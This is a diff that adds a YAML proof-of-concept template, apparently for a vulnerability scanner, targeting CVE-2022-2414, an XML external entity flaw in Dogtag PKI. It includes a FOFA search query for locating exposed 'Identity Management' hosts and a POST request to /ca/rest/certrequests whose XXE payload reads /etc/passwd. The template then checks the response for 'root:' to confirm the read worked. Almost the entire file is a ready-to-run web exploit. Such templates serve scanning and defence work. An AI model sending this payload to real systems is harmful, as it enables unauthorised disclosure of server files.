@@ -1,0 +1,36 @@
+id: poc-yaml-dogtagpki-xml-external-entity-injection
+info:
+  name: Dogtagpki XML 外部实体注入漏洞(CVE-2022-2414)
+  severity: high
+  tags:
+  - CVE-2022-2414
+  - xxe
+  finger: dogtagpki
+  fofa: title="Identity Management"
+requests:
+- method: POST
+  path: /ca/rest/certrequests
+  headers:
+    Content-Type: application/xml
+  data: '<!--?xml version="1.0" ?-->
+
+    <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+
+    <CertEnrollmentRequest>
+
+    <Attributes/>
+
+    <ProfileID>&ent;</ProfileID>
+
+    </CertEnrollmentRequest>'
+  expression: 'status_code == 400 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"PKIException") &&
+
+    contains(headers,"application/xml")
+
+    '
+variables: {}
+transport: http
